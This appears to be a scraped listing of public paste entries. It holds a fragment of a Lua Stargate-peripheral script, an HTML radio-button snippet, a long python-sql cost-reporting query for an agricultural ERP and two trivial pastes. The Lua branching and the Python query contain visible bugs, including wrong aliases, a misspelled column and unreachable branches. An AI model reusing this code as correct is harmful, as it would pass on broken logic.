    ""crystal_interface"",
    ""advanced_crystal_interface""
};

INTERFACE_TYPE = INTERFACE_TYPES[1];
INTERFACE = peripheral.find(INTERFACE_TYPE);
if INTERFACE == null then
    INTERFACE_TYPE = INTERFACE_TYPES[2];
    INTERFACE = peripheral.find(INTERFACE_TYPE);
elseif INTERFACE == null then
    INTERFACE_TYPE = INTERFACE_TYPES[3];
    INTERFACE = peripheral.find(INTERFACE_TYPE);
elseif INTERFACE == null then
    INTERFACE_TYPE = nil;
end

if INTERFACE_TYPE == nil then
    STARGATE_TYPE = nil;
else
    STARGATE_TYPE = INTERFACE.getStargateType();
end

print(""Interface Type : "" + INTERFACE_TYPE);
print(""Stargate Type : "" + STARGATE_TYPE);"
k1zMG0gY,Mad,Unknown_No_1,PHP,Tuesday 23rd of April 2024 09:47:14 AM CDT,palestine
fTPf322t,link input and label,VanoHa,HTML 5,Tuesday 23rd of April 2024 09:44:46 AM CDT,"<div>
  <input type=""radio"" id=""python"" name=""language"" checked>
  <label for=""python"">Python</label>
</div>
<div>
  <input type=""radio"" id=""java"" name=""language"">
  <label for=""java"">Java</label>
</div>"
6xWt8m3Z,python,sergyo,Python,Tuesday 23rd of April 2024 09:41:36 AM CDT,"from sql import Null, Literal, With, Union, Cast, Column, Window, Table
from sql.aggregate import Sum, Min
from sql.operators import Concat, Not
from sql.conditionals import Coalesce, Case
from sql.functions import Round, Position, Substring
from datetime import date

DIGITS = 4
from_date = date(2024, 1, 1)
bunit_load = Table('stock_unit_load')
brline = Table('agro_goods_receipt_line')
breceipt = Table('agro_goods_receipt')

base_query = bunit_load.join(brline, condition=(
        brline.id == bunit_load.goods_receipt_line)
    ).join(breceipt, condition=(breceipt.id == brline.receipt)
    ).select(
        bunit_load.id.as_('received_unit_load'),
        bunit_load.internal_quantity.as_('received_quantity'),
        bunit_load.id.as_('destination_unit_load'),
        bunit_load.internal_quantity.as_('destination_quantity'),
        where=(
            (breceipt.company == 1)
            & (Coalesce(breceipt.effective_date, from_date) > from_date)
            & (
                (bunit_load.sale_line != Null)
                | bunit_load.shipment.like('stock.shipment.in.return,%')
            )
        )
    )


invoice_line = Table('account_invoice_line')
invoice = Table('account_invoice')
saleline2 = Table('sale_line')
sale2 = Table('sale_sale')

invoice_origin_column = Cast(Substring(invoice_line.origin,
        Position(',', invoice_line.origin) + Literal(1)),
        'int')
invoice_query = invoice_line.join(invoice, type_='LEFT', condition=(
            invoice.id == invoice_line.invoice)
    ).join(saleline2, condition=(saleline2.id == invoice_origin_column)
    ).join(sale2, condition=(sale2.id == saleline2.sale)
    ).select(
        invoice_origin_column.as_('sale_line'),
        Sum(invoice_line.unit_price * invoice_line.quantity
            ).as_('amount'),
        Sum(invoice_line.quantity).as_('quantity'),
        Min(invoice.invoice_date).as_('invoice_date_min'),
        where=(
            (Coalesce(invoice.state, 'draft') != 'cancelled')
            & (invoice_line.origin != Null)
            & invoice_line.origin.like('sale.line,%')
            & (sale2.company == 1)
            & (Coalesce(sale2.sale_date, from_date) > from_date)
        ),
        group_by=invoice_origin_column
)

unit_load = Table('stock_unit_load')
rline = Table('agro_goods_receipt_line')
receipt = Table('agro_goods_receipt')
entry = Table('agro_goods_entry')
product = Table('product_product')
template = Table('product_template')
company = Table('company_company')
currency = Table('currency_currency')
uom = Table('product_uom')
sale_unit_load = Table('stock_unit_load')
destination_product = Table('product_product')
destination_comb = Table('agro_product_attribute_combination')
sale_line = Table('sale_line')
sale = Table('sale_sale')

windows = {
    'sale_quantity': Sum(
        base_query.destination_quantity,
        window=Window([sale_line.id])),
    'entry_quantity': Sum(
        Case(
            (unit_load.goods_receipt_line != Null,
                Round(Coalesce(base_query.received_quantity,
                        Coalesce(base_query.received_quantity,
                            unit_load.internal_quantity)
                        ).cast('numeric'), DIGITS)
            ), else_=Null), window=Window(
            [rline.entry]))
}

cost_line = Table('agro_goods_entry_cost_line')
cost = Table('agro_goods_entry_cost')
cost_type = Table('agro_goods_entry_cost_type')
cost_entry = Table('agro_goods_entry')
cost_receipt = Table('agro_goods_receipt')
base_cost_query = cost_line.join(cost, condition=(cost.id == cost_line.cost)
        ).join(cost_type, condition=(cost_type.id == cost.type_)
        ).join(cost_entry, condition=(cost_entry.id == cost_line.document_line)
        ).join(cost_receipt, condition=cost_receipt.id == cost_entry.receipt)
cost_query = base_cost_query.select(
    cost_line.document_line.as_('entry'),
    Sum(cost_line.amount).as_('amount'),
    where=(
        (cost_receipt.company == 1)
        & (Coalesce(cost_receipt.effectivate_date, from_date) > from_date)
        & (cost_line.amount != Null)
        & (cost.state == 'confirmed')),
    group_by=cost_line.document_line)

entry_invoice_line = Table('account_invoice_line')
entry_invoice = Table('account_invoice')
ientry = Table('agro_goods_entry')
ireceipt = Table('agro_goods_receipt')
invoice_origin_column = Substring(entry_invoice_line.origin,
    Position(',', entry_invoice_line.origin) + Literal(1))
invoice_entry_base_query = entry_invoice_line.join(entry_invoice, type_='LEFT',
        condition=(invoice.id == invoice_line.invoice)
    ).join(ientry, condition=(
        ientry.id == invoice_origin_column.cast('int'))
    ).join(ireceipt, condition=(ireceipt.id == ientry.receipt))
invoice_entry_query = invoice_entry_base_query.select(
        Cast(invoice_origin_column, 'int').as_('entry'),
        Sum(entry_invoice_line.unit_price * entry_invoice_line.quantity
            ).as_('amount'),
        Min(entry_invoice.invoice_date).as_('invoice_date_min'),
        where=(
            (Coalesce(entry_invoice.state, 'draft') != 'cancelled')
            & (ireceipt.company == 1)
            & (Coalesce(ireceipt.effective_date, from_date) > from_date)
            & entry_invoice_line.origin.like('agro.goods.entry,%')
        ),
        group_by=invoice_origin_column)

prcost = Table('cm_unit_load_cost_alloc')
processing_rcost = prcost.select(
    prcost.end_.as_('unit_load'),
    Sum(prcost.amount).as_('processing_cost_amount'),
    Sum(Case((prcost.type_ == 1, prcost.amount),
        else_=0)).as_('processing_fixed_cost_amount'),
    Sum(Case((prcost.type_ == 2, prcost.amount),
        else_=0)).as_('processing_labor_cost_amount'),
    where=(
        (prcost.company == 1)
        & (Coalesce(prcost.date, from_date) > from_date)),
    group_by=prcost.end_
)

pscost = Table('cm_unit_load_cost_alloc')
processing_scost = pscost.select(
    pscost.end_.as_('unit_load'),
    Sum(pscost.amount).as_('processing_cost_amount'),
    Sum(Case((pscost.type_ == 1, pscost.amount),
        else_=0)).as_('processing_fixed_cost_amount'),
    Sum(Case((pscost.type_ == 2, pscost.amount),
        else_=0)).as_('processing_labor_cost_amount'),
    where=(
        (pscost.company == 1)
        & (Coalesce(pscost.date, from_date) > from_date)),
    group_by=pscost.end_
)

scost = Table('sale_cost')
scost_line = Table('sale_cost_line')
scost_type = Table('sale_cost_type')
scost_sale = Table('sale_sale')
sale_cost_base_query = scost_line.join(scost,
        condition=(scost.id == scost_line.cost)
    ).join(scost_type, condition=(scost_type.id == scost.type_)
    ).join(scost_sale, condition=(scost.document == scost_sale.id))
sale_cost_query = sale_cost_base_query.select(
    scost_line.document_line.as_('sale_line'),
    Sum(scost_line.amount).as_('amount'),
    where=(
        (scost_sale.company == 1)
        & (Coalesce(scost_sale.sale_date, from_date) > from_date)),
    group_by=scost_line.document_line)

sale_account_line = Table('sale_sale_account_line')
asale_line = Table('sale_line')
asale = Table('sale_sale')
sale_account_query = sale_account_line.join(asale_line, condition=(
        sale_account_line.sale_line == asale_line.id)
    ).join(asale, condition=(asale.id == asale_line.sale)
    ).select(
        sale_account_line.sale_line,
        Sum(sale_account_line.quantity).as_('quantity'),
        where=(
            (sale.company == 1)
            & (Coalesce(sale.sale_date, from_date) > from_date)),
        group_by=(sale_account_line.sale_line))


query = base_query.join(unit_load, condition=(
            base_query.received_unit_load == unit_load.id)
        ).join(product, condition=(
            product.id == unit_load.product)
        ).join(template, condition=(
            product.template == template.id)
        ).join(rline, condition=(
            rline.id == unit_load.goods_receipt_line)
        ).join(entry, condition=(
            rline.entry == entry.id)
        ).join(receipt, condition=(receipt.id == rline.receipt)
        ).join(company, condition=(unit_load.company == company.id)
        ).join(currency, condition=(company.currency == currency.id)
        ).join(uom, condition=(uom.id == template.default_uom)
        ).join(sale_unit_load, 'LEFT', condition=(
            sale_unit_load.id == base_query.destination_unit_load)
        ).join(destination_product, 'LEFT', condition=(
            sale_unit_load.product == destination_product.id)
        ).join(destination_comb, 'LEFT', condition=(
            destination_comb.result_product == destination_product.template)
        ).join(sale_line, type_='LEFT', condition=(
            sale_line.id == sale_unit_load.sale_line)
        ).join(sale, type_='LEFT', condition=(sale.id == sale_line.sale)
        ).join(invoice_query, type_='LEFT', condition=(
            invoice_query.sale_line == sale_line.id)
        ).join(cost_query, 'LEFT', condition=(
            cost_query.entry == entry.id)
        ).join(invoice_entry_query, type_='LEFT', condition=(
            invoice_entry_query.entry == entry.id)
        ).join(processing_rcost, 'LEFT', condition=(
            processing_rcost.unit_load == unit_load.id)
        ).join(processing_scost, 'LEFT', condition=(
            (sale_unit_load.id != Null)
            & (processing_scost.unit_load == sale_unit_load.id)
            & (processing_scost.unit_load != unit_load.id))
        ).join(sale_cost_query, 'LEFT', condition=(
            sale_cost_query.sale_line == sale_line.id)
        ).join(sale_account_query, 'LEFT',
            condition=(sale_account_query.sale_line == sale_line.id)
    ).select(
        unit_load.create_date,
        unit_load.write_date,
        unit_load.create_uid,
        unit_load.write_uid,
        unit_load.company,
        Case(
            (unit_load.goods_receipt_line != Null, unit_load.id),
            else_=Literal(Null)).as_('received_unit_load'),
        Case(
            (unit_load.goods_receipt_line != Null, unit_load.product),
            else_=Literal(Null)).as_('received_product'),
        Cast(receipt.effective_date, 'date').as_('receipt_date'),
        rline.receipt,
        rline.entry.as_('goods_entry'),
        entry.producer,
        entry.origin.as_('entry_origin'),
        Case(
            (Coalesce(entry.origin, '').like('agro.farm.batch,%'),
                Cast(Substring(entry.origin,
                    Position(',', entry.origin) + Literal(1)),
                        'int')
            ),
            else_=Literal(Null)
        ).as_('batch'),
        entry.base_product,
        entry.crop,
        sale.id.as_('sale'),
        sale_line.id.as_('sale_line'),
        sale_line.unit_price.as_('sale_unit_price'),
        sale.party.as_('customer'),
        sale.shipment_party,
        template.default_uom.as_('uom'),
        sale_unit_load.id.as_('destination_unit_load'),
        sale_unit_load.product.as_('destination_product'),
        sale_unit_load.attribute_category.as_('destination_category'),
        sale_unit_load.attribute_caliber.as_('destination_caliber'),
        sale_unit_load.attribute_confection.as_('destination_confection'),
        destination_comb.product.as_('destination_base_product'),
        Case(
            (sale_unit_load.goods_receipt_line != Null, 'farm'),
            else_='warehouse').as_('destination_ul_type'),
        sale.sale_date,
        company.currency,
        currency.digits.as_('currency_digits'),
        uom.digits.as_('uom_digits'),
        invoice_query.invoice_date_min,
        Case(
            (unit_load.goods_receipt_line != Null,
                Round(Coalesce(base_query.received_quantity,
                        Coalesce(base_query.received_quantity,
                            unit_load.internal_quantity)
                        ).cast('numeric'), DIGITS)
            ), else_=Null).as_('received_quantity'),
        Round(
            Case((base_query.destination_unit_load != Null,
                Coalesce(base_query.destination_quantity, 0)),
                else_=0).cast('numeric'), DIGITS).as_('destination_quantity'),
        (sale_line.unit_price * Coalesce(
                base_query.destination_quantity, 0)).as_('sale_amount'),
        Case((
                (invoice.sale_line != Null)
                & (Coalesce(windows['sale_quantity'], 0) != 0),
            Round((Coalesce(invoice.amount, 0) * (
                Coalesce(base_query.destination_quantity, 0)
                / windows['sale_quantity'])
            ).cast('decimal'), currency.digits)
            ),
            else_=Null).as_('invoice_amount'),
        Case(((
            (invoice.sale_line != Null)
            & (Coalesce(windows['sale_quantity'], 0) != 0)),
            Round((Coalesce(invoice.quantity, 0)
                * (Coalesce(base_query.destination_quantity, 0)
                    / windows['sale_quantity'])
                ).cast('numeric'), DIGITS)),
            else_=Null).as_('invoice_quantity'),
        Case((
            Coalesce(sale_unit_load.internal_quantity, 0) == 0, 0),
            else_=Round(
                Coalesce(sale_unit_load.cases_quantity, 0).cast('numeric') * (
                    Round(
                        Case((base_query.destination_unit_load != Null,
                            Coalesce(base_query.destination_quantity, 0)),
                            else_=0).cast('numeric'), DIGITS)
                    / sale_unit_load.internal_quantity.cast('numeric')
                ).cast('numeric'), DIGITS)
        ).as_('destination_cases_quantity'),
        Coalesce(Coalesce(Case((
                (invoice.sale_line != Null)
                & (Coalesce(windows['sale_quantity'], 0) != 0),
                Round((Coalesce(invoice.amount, 0) * (
                    Coalesce(base_query.destination_quantity, 0)
                    / windows['sale_quantity'])
                ).cast('decimal'), currency.digits)
                ),
                else_=Null),
            (sale_line.unit_price * Coalesce(
                base_query.destination_quantity, 0))), 0
        ).as_('income_amount'),
        Case((
            Coalesce(sale_unit_load.internal_quantity, 0) == 0, 0),
            else_=-Round(
                (sale_unit_load.bom_amount * (
                    Round(
                        Case((base_query.destination_unit_load != Null,
                            Coalesce(base_query.destination_quantity, 0)),
                            else_=0).cast('numeric'), DIGITS)
                    / sale_unit_load.internal_quantity)).cast('decimal'),
                currency.digits)
        ).as_('bom_amount'),
        Case((
            (cost_entry.entry != Null) & (windows['entry_quantity'] != 0),
            -Round((
                Coalesce(cost_entry.amount, 0) * (
                    Coalesce(Case(
                        (unit_load.goods_receipt_line != Null,
                            Round(Coalesce(base_query.received_quantity,
                                    Coalesce(base_query.received_quantity,
                                        unit_load.internal_quantity)
                                    ).cast('numeric'), DIGITS)
                        ), else_=Null), 0)
                    / windows['entry_quantity'])).cast('decimal'),
            currency.digits)), else_=Null).as_('entry_cost_amount'),
        Case((
                Coalesce(sale_unit_load.internal_quantity, 0) != 0,
                Round(((Coalesce(-processing_scost.processing_cost_amount, 0)
                    / sale_unit_load.internal_quantity
                        ) * Round(
                        Case((base_query.destination_unit_load != Null,
                            Coalesce(base_query.destination_quantity, 0)),
                            else_=0).cast('numeric'), DIGITS)
                        ).cast('decimal'),
                    currency.digits)),
            else_=0) + Case((
                Coalesce(unit_load.internal_quantity, 0) != 0,
                Round(((Coalesce(-processing_rcost.processing_cost_amount, 0)
                    / unit_load.internal_quantity
                        ) * Case(
                        (unit_load.goods_receipt_line != Null,
                            Round(Coalesce(base_query.received_quantity,
                                    Coalesce(base_query.received_quantity,
                                        unit_load.internal_quantity)
                                    ).cast('numeric'), DIGITS)
                        ), else_=Null)).cast('decimal'),
                    currency.digits)),
                else_=0).as_('processing_cost_amount'),
        Case((
                Coalesce(sale_unit_load.internal_quantity, 0) != 0,
                Round(((Coalesce(-processing_scost.processing_fixed_cost_amount, 0)
                    / sale_unit_load.internal_quantity
                        ) * Round(
                        Case((base_query.destination_unit_load != Null,
                            Coalesce(base_query.destination_quantity, 0)),
                            else_=0).cast('numeric'), DIGITS)
                        ).cast('decimal'),
                    currency.digits)),
            else_=0) + Case((
                Coalesce(unit_load.internal_quantity, 0) != 0,
                Round(((Coalesce(-processing_rcost.processing_fixed_cost_amount, 0)
                    / unit_load.internal_quantity
                        ) * Case(
                        (unit_load.goods_receipt_line != Null,
                            Round(Coalesce(base_query.received_quantity,
                                    Coalesce(base_query.received_quantity,
                                        unit_load.internal_quantity)
                                    ).cast('numeric'), DIGITS)
                        ), else_=Null)).cast('decimal'),
                    currency.digits)),
                else_=0).as_('processing_fixed_cost_amount'),
        Case((
                Coalesce(sale_unit_load.internal_quantity, 0) != 0,
                Round(((Coalesce(-processing_scost.processing_labor_cost_amount, 0)
                    / sale_unit_load.internal_quantity
                        ) * Round(
                        Case((base_query.destination_unit_load != Null,
                            Coalesce(base_query.destination_quantity, 0)),
                            else_=0).cast('numeric'), DIGITS)
                        ).cast('decimal'),
                    currency.digits)),
            else_=0) + Case((
                Coalesce(unit_load.internal_quantity, 0) != 0,
                Round(((Coalesce(-processing_rcost.processing_labor_cost_amount, 0)
                    / unit_load.internal_quantity
                        ) * Case(
                        (unit_load.goods_receipt_line != Null,
                            Round(Coalesce(base_query.received_quantity,
                                    Coalesce(base_query.received_quantity,
                                        unit_load.internal_quantity)
                                    ).cast('numeric'), DIGITS)
                        ), else_=Null)).cast('decimal'),
                    currency.digits)),
                else_=0).as_('processing_labor_cost_amount'),
            Case((
                Coalesce(sale_line.quantity, 0) != 0,
                -Round((Coalesce(
                    sale_cost_query.amount, 0) * (
                    Round(
                        Case((base_query.destination_unit_load != Null,
                            Coalesce(base_query.destination_quantity, 0)),
                            else_=0
                            ).cast('numeric'), DIGITS) / sale_line.quantity)
                                ).cast('decimal'), currency.digits)),
                else_=0).as_('sale_cost_amount'),
            Case(((
                (sale_account_query.sale_line != Null)
                & (Coalesce(windows['sale_quantity'], 0) != 0)),
                Round((Coalesce(sale_account_query.quantity, 0)
                    * (Coalesce(base_query.destination_quantity, 0)
                        / windows['sale_quantity'])
                ).cast('numeric'), DIGITS)),
                else_=Null).as_('sold_account_quantity'),
        where=(
            (receipt.company == 1)
            & (Coalesce(receipt.effective_date, from_date) > from_date))
    )

print(query)
print(query.params)
"
qmD0p666,邀您一起看：热辣滚烫,xiaomianao666,JavaScript,Tuesday 23rd of April 2024 09:37:20 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥热辣滚烫@@
